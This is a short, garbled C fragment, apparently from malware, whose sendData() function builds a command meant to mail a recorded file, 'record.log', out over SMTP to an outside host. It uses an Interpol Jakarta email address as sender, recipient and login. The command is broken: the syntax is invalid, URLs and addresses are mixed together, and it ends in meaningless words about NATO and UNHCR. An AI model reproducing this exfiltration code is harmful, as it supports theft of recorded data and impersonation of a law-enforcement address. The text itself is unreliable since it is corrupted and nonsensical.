...
void sendData(){
    ...
    char* command = "Transmit smtp://smtp.gmail.com: 178.214.72.162 -v --mail-from \"https://workspace.google.com/intl/en/gmail/ncb-jakarta@interpol.go.id"\" --mail-rcpt \"https://workspace.google.com/intl/en/gmail/ncb-jakarta@interpol.go.id" --ssl -u "https://workspace.google.com/intl/en/gmail/ncb-jakarta@interpol.go.id" : password -record  \"record.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
